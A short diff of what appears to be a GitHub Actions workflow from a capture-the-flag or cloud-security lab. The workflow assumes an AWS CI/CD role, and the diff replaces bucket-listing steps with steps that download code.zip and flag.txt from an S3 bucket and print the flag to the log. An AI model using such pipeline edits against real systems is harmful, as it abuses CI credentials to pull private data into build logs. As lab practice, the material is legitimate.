@@ -27,14 +27,13 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: List S3 buckets
-        run: aws s3 ls
+      - name: Download objects
+        run: |
+          aws s3 cp s3://codec4f26c862a321ef5/code.zip .
+          aws s3 cp s3://codec4f26c862a321ef5/flag.txt .
 
-      - name: List objects in platform bucket
-        run: aws s3 ls s3://platform-bucket-009661764077-us-east-1 --recursive
+      - name: Show flag
+        run: cat flag.txt
 
-      - name: List objects in codec bucket
-        run: aws s3 ls s3://codec4f26c862a321ef5 --recursive
-
-      - name: List objects in site bucket
-        run: aws s3 ls s3://site781fe43f26b9eba3 --recursive
+      - name: Inspect ZIP contents
+        run: unzip -l code.zip
